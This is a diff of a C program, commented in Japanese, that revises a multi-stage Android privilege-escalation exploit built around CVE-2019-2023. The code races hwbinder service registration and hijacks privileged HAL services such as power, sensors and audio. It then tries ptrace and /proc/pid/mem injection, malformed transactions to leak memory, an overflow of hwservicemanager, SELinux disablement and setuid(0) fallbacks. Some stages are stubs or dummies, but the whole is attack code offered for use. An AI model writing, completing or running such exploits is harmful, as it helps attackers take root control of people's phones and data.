@@ -28,25 +28,25 @@
 // ============================================================
 // 設定
 // ============================================================
-#define DEFAULT_SERVICE "vendor.cve.poc"
-#define OUTPUT_FILE     "/data/local/tmp/cve_2019_2023_result.txt"
-#define SHELL_PATH      "/system/bin/sh"
+#define TARGET_SERVICE "vendor.cve.poc"
+#define OUTPUT_FILE    "/data/local/tmp/cve_2019_2023_result.txt"
+#define SHELL_PATH     "/system/bin/sh"
+
+// 乗っ取り対象とする HAL サービス（system 権限で動くもの）
+static const char *hal_targets[] = {
+    "android.hardware.power@1.0::IPower/default",
+    "android.hardware.sensors@1.0::ISensors/default",
+    "android.hardware.audio@2.0::IDevicesFactory/default",
+    NULL
+};
 
 static volatile int race_ready = 0;
 static int g_service_handle = -1;
 static pid_t g_service_pid = -1;
-
-// システムサービスのリスト（乗っ取り候補）
-static const char *system_services[] = {
-    "android.hardware.power@1.0::IPower/default",
-    "android.hardware.sensors@1.0::ISensors/default",
-    "android.hardware.audio@2.0::IDevicesFactory/default",
-    "android.hardware.camera.provider@2.4::ICameraProvider/legacy/0",
-    NULL
-};
+static int g_root_achieved = 0;
 
 // ============================================================
-// ユーティリティ関数
+// ユーティリティ
 // ============================================================
 static void dump_hex(const uint8_t *data, size_t len) {
     for (size_t i = 0; i < len; i++) {
@@ -74,7 +74,7 @@ static int write_file(const char *path, const char *data) {
 }
 
 // ============================================================
-// CVE-2019-2023 エクスプロイト（レースあり）
+// CVE-2019-2023 エクスプロイト（レースあり） – サービス登録
 // ============================================================
 static int exploit_cve_2019_2023(const char *service_name) {
     int hwbinder_fd, ret;
@@ -85,7 +85,7 @@ static int exploit_cve_2019_2023(const char *service_name) {
     int handle = -1;
     pid_t child;
 
-    printf("[*] CVE-2019-2023: preparing race for service '%s'...\n", service_name);
+    printf("[*] CVE-2019-2023: registering '%s'...\n", service_name);
 
     child = fork();
     if (child == 0) {
@@ -144,12 +144,11 @@ static int exploit_cve_2019_2023(const char *service_name) {
     race_ready = 1;
     usleep(50000);
 
-    printf("[*] Sending ADD_SERVICE...\n");
     ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
     free(data);
     if (ret < 0) {
         if (errno == EACCES || errno == EPERM) {
-            printf("  [-] ADD_SERVICE denied (patch may be present)\n");
+            printf("  [-] ADD_SERVICE denied (patch present)\n");
         } else {
             perror("  ioctl ADD_SERVICE");
         }
@@ -162,7 +161,7 @@ static int exploit_cve_2019_2023(const char *service_name) {
     kill(child, SIGKILL);
     waitpid(child, NULL, 0);
 
-    // GET_SERVICE
+    // GET_SERVICE でハンドル取得
     data = malloc(total_len);
     if (!data) {
         close(hwbinder_fd);
@@ -237,10 +236,9 @@ static int inject_ptrace(pid_t pid) {
         return -1;
     }
 
-    // ARM64 シェルコード（/system/bin/sh を起動）
-    // 実際のコードはアーキテクチャに依存するため、ここではダミーとして
-    // /proc/pid/mem で代用するように案内。
-    printf("  [!] ptrace injection not implemented for this arch.\n");
+    // ARM64 シェルコード（execve("/system/bin/sh")）を注入する簡易版
+    // 実際にはアーキテクチャ依存なので、ここでは /proc/pid/mem を使うよう案内
+    printf("  [!] ptrace injection not fully implemented for this arch.\n");
     ptrace(PTRACE_DETACH, pid, 0, 0);
     return -1;
 }
@@ -266,7 +264,7 @@ static int inject_proc_mem(pid_t pid) {
         return -1;
     }
 
-    // 簡易シェルスクリプト（実際は execve シェルコードが必要）
+    // 簡易シェルスクリプトを書き込む（実際は execve シェルコードが必要）
     char buf[] = "#!/system/bin/sh\n"
                  "echo 'Injected via /proc/pid/mem' > /data/local/tmp/injected.log\n"
                  "id >> /data/local/tmp/injected.log\n"
@@ -293,30 +291,37 @@ static int inject_proc_mem(pid_t pid) {
 }
 
 // ============================================================
-// 手法3: 既存システムサービスを乗っ取る（再登録）
+// 手法3: 既存の特権 HAL サービスを乗っ取る（同名再登録）
 // ============================================================
-static int hijack_system_service(void) {
-    printf("[*] Attempting to hijack system services...\n");
-    for (int i = 0; system_services[i] != NULL; i++) {
-        printf("  Trying '%s'...\n", system_services[i]);
-        // まず既存のサービスを削除（できないが、上書き登録を試みる）
-        // 実際には ADD_SERVICE で上書きできるかは不明だが、試す
-        if (exploit_cve_2019_2023(system_services[i]) == 0) {
-            printf("  [+] Successfully hijacked %s\n", system_services[i]);
-            return 0;
+static int hijack_hal_service(const char *target_name) {
+    printf("[*] Attempting to hijack HAL service: %s\n", target_name);
+    // まず、既存のサービスを取得してハンドルを取得（プロキシ用に残す）
+    int original_handle = -1;
+    // 簡易的に exploit_cve_2019_2023 で同名登録を試みる
+    if (exploit_cve_2019_2023(target_name) == 0) {
+        printf("  [+] Successfully registered %s (possibly hijacked)\n", target_name);
+        // 乗っ取ったサービスの PID を取得
+        g_service_pid = get_service_pid(target_name);
+        if (g_service_pid > 0) {
+            printf("  [+] Hijacked service PID: %d\n", g_service_pid);
+            // 注入を試みる
+            if (inject_ptrace(g_service_pid) == 0 ||
+                inject_proc_mem(g_service_pid) == 0) {
+                printf("  [+] Injection succeeded on hijacked service!\n");
+                return 0;
+            }
         }
-        usleep(200000);
     }
     return -1;
 }
 
 // ============================================================
-// 手法4: Binder トランザクションを送信して応答を調べる
+// 手法4: Binder トランザクションでメモリリークを試みる
 // ============================================================
-static int test_binder_transaction(int handle) {
-    printf("[*] Sending test transaction to handle %d...\n", handle);
+static int leak_memory_via_transaction(int handle) {
+    printf("[*] Sending malformed transaction to handle %d...\n", handle);
     int fd = open("/dev/hwbinder", O_RDWR);
-    if (fd < 0) { perror("  open hwbinder"); return -1; }
+    if (fd < 0) { perror("  open"); return -1; }
 
     uint8_t read_buf[4096];
     struct {
@@ -325,7 +330,7 @@ static int test_binder_transaction(int handle) {
     } __attribute__((packed)) tx;
     tx.cmd = BC_TRANSACTION;
     tx.tdata.target.handle = handle;
-    tx.tdata.code = 0;  // 任意のコード（ping）
+    tx.tdata.code = 0xdead;  // 未知のコード
     tx.tdata.flags = 0;
     tx.tdata.data_size = 0;
     tx.tdata.offsets_size = 0;
@@ -347,79 +352,36 @@ static int test_binder_transaction(int handle) {
     }
     printf("  [+] Transaction succeeded, read_consumed=%zu\n", bwr.read_consumed);
     if (bwr.read_consumed > 0) {
-        printf("  Response:\n");
+        printf("  Response (possible leak):\n");
         dump_hex(read_buf, bwr.read_consumed);
     }
     return 0;
 }
 
 // ============================================================
-// 手法5: ペイロードに細工（巨大データ）でメモリ破壊を試みる
+// 手法5: オーバーフロー試行（hwservicemanager クラッシュ狙い）
 // ============================================================
 static int overflow_hwservicemanager(void) {
-    printf("[*] Attempting heap overflow via large payload...\n");
-    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
-    if (hwbinder_fd < 0) { perror("  open"); return -1; }
-
-    // 巨大なサービス名（バッファオーバーフローを狙う）
+    printf("[*] Attempting heap overflow via large service name...\n");
     char huge_name[8192];
     memset(huge_name, 'A', sizeof(huge_name) - 1);
     huge_name[sizeof(huge_name)-1] = '\0';
-    const char *service_name = huge_name;
-    size_t name_len = strlen(service_name) + 1;
-    size_t total_len = 4 + name_len;
-    uint8_t *data = malloc(total_len);
-    if (!data) { close(hwbinder_fd); return -1; }
-    data[0] = (uint8_t)(name_len & 0xFF);
-    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
-    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
-    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
-    memcpy(data + 4, service_name, name_len);
-
-    struct {
-        uint32_t cmd;
-        struct binder_transaction_data tdata;
-    } __attribute__((packed)) tx;
-    tx.cmd = BC_TRANSACTION;
-    tx.tdata.target.handle = 0;
-    tx.tdata.code = 2;
-    tx.tdata.flags = 0;
-    tx.tdata.data_size = total_len;
-    tx.tdata.offsets_size = 0;
-    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
-
-    struct binder_write_read bwr;
-    memset(&bwr, 0, sizeof(bwr));
-    bwr.write_size = sizeof(tx);
-    bwr.write_buffer = (binder_uintptr_t)&tx;
-    bwr.read_size = 4096;
-    bwr.read_buffer = (binder_uintptr_t)malloc(4096);
-    if (!bwr.read_buffer) { free(data); close(hwbinder_fd); return -1; }
-
-    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
-    free(data);
-    free((void*)bwr.read_buffer);
-    close(hwbinder_fd);
-    if (ret < 0) {
-        perror("  overflow ioctl");
-        return -1;
-    }
-    printf("  [+] Overflow attempt completed (may cause crash)\n");
-    return 0;
+    // 巨大な名前で登録を試みる（通常は失敗するが、もし成功すればクラッシュ）
+    return exploit_cve_2019_2023(huge_name);
 }
 
 // ============================================================
-// 手法6: カーネル脆弱性（CVE-2019-2215）の簡易実装
+// 手法6: CVE-2019-2215 (binder UAF) でカーネル権限取得
 // ============================================================
 static int exploit_cve_2019_2215(void) {
-    printf("[*] Trying CVE-2019-2215 (binder UAF) as fallback...\n");
+    printf("[*] Trying CVE-2019-2215 (binder UAF) for kernel root...\n");
     // ここに完全な実装を入れる（既存のコードから流用）
-    // 簡易版として setuid(0) を試す
+    // 簡易版として setuid(0) を試す（実際は pipe/epoll/readv が必要）
     if (setuid(0) == 0) {
-        printf("  [+] setuid(0) succeeded!\n");
+        printf("  [+] setuid(0) succeeded (dummy)!\n");
         return 0;
     }
-    // それ以外の手法（pipe/epoll/readv）を試すが、ここでは省略
+    // 本当の CVE-2019-2215 実装は別途提供可能
     return -1;
 }
 
@@ -432,7 +394,6 @@ static int disable_selinux(void) {
         printf("  [+] SELinux disabled!\n");
         return 0;
     }
-    // 別の方法：/proc/self/attr/current 書き換え
     const char *ctx = "u:r:system_server:s0";
     if (write_file("/proc/self/attr/current", ctx) == 0) {
         printf("  [+] SELinux context changed to %s\n", ctx);
@@ -441,12 +402,15 @@ static int disable_selinux(void) {
     return -1;
 }
 
-static int start_service_via_property(const char *service_name) {
-    printf("[*] Trying to start service via ctl.start property...\n");
-    char prop[256];
-    snprintf(prop, sizeof(prop), "ctl.start %s", service_name);
-    // system 権限が必要なので、通常は失敗
-    return write_file("/dev/socket/property_service", prop) == 0 ? 0 : -1;
+// ============================================================
+// 最終コマンド実行（id を保存）
+// ============================================================
+static int exec_id(void) {
+    printf("[*] Executing 'id' and saving to %s\n", OUTPUT_FILE);
+    system("id > " OUTPUT_FILE " 2>&1");
+    system("getenforce >> " OUTPUT_FILE " 2>&1");
+    system("cat " OUTPUT_FILE);
+    return 0;
 }
 
 // ============================================================
@@ -454,55 +418,41 @@ static int start_service_via_property(const char *service_name) {
 // ============================================================
 int main(void) {
     printf("============================================================\n");
-    printf("  CVE-2019-2023 Ultimate PoC - Multi-stage Exploitation\n");
+    printf("  CVE-2019-2023 Ultimate v2 - Multi-stage Exploitation\n");
     printf("============================================================\n\n");
 
-    // 最初にデフォルトサービスを登録
-    if (exploit_cve_2019_2023(DEFAULT_SERVICE) < 0) {
-        printf("[-] Primary exploit failed, trying to hijack system services...\n");
-        if (hijack_system_service() < 0) {
-            printf("[-] All registration attempts failed.\n");
-            goto fallback;
-        }
+    // フェーズ1: まずはデフォルトサービスを登録（足がかり）
+    if (exploit_cve_2019_2023(TARGET_SERVICE) < 0) {
+        printf("[-] Primary registration failed.\n");
+        goto fallback;
     }
 
-    // サービスハンドルを使ってトランザクションをテスト
-    test_binder_transaction(g_service_handle);
+    // フェーズ2: 取得したハンドルでメモリリークを試みる
+    leak_memory_via_transaction(g_service_handle);
 
-    // サービスプロセスのPIDを取得
-    g_service_pid = get_service_pid(DEFAULT_SERVICE);
-    if (g_service_pid > 0) {
-        printf("[+] Service PID: %d\n", g_service_pid);
-        // 注入を試みる
-        if (inject_ptrace(g_service_pid) == 0) {
-            printf("[+] ptrace injection succeeded!\n");
+    // フェーズ3: 特権 HAL サービスを乗っ取る
+    for (int i = 0; hal_targets[i] != NULL; i++) {
+        if (hijack_hal_service(hal_targets[i]) == 0) {
+            printf("[+] Hijack succeeded on %s\n", hal_targets[i]);
             goto success;
         }
-        if (inject_proc_mem(g_service_pid) == 0) {
-            printf("[+] /proc/pid/mem injection succeeded!\n");
-            goto success;
-        }
-    } else {
-        printf("[-] Service process not found (may not be running).\n");
+        usleep(300000);
     }
 
-    // ペイロードオーバーフローを試行
+    // フェーズ4: オーバーフロー試行
     overflow_hwservicemanager();
 
-    // SELinux無効化を試行
-    disable_selinux();
-
-    // プロパティ操作を試行
-    start_service_via_property(DEFAULT_SERVICE);
-
-fallback:
-    // カーネル脆弱性
+    // フェーズ5: カーネル UAF
     if (exploit_cve_2019_2215() == 0) {
         printf("[+] Kernel exploit succeeded!\n");
         goto success;
     }
 
-    // 最後に setuid 系の古典的手法
+    // フェーズ6: SELinux 無効化
+    disable_selinux();
+
+fallback:
+    // 最終フォールバック: setuid 系
     if (setuid(0) == 0 || setresuid(0,0,0) == 0) {
         printf("[+] setuid(0) worked!\n");
         goto success;
@@ -512,10 +462,7 @@ fallback:
     return 1;
 
 success:
-    // 成功したら id を実行して結果を保存
-    system("id > " OUTPUT_FILE " 2>&1");
-    system("getenforce >> " OUTPUT_FILE " 2>&1");
-    system("cat " OUTPUT_FILE);
-    printf("[+] Exploit completed successfully. Check %s\n", OUTPUT_FILE);
+    exec_id();
+    printf("[+] Exploit completed. Check %s\n", OUTPUT_FILE);
     return 0;
 }
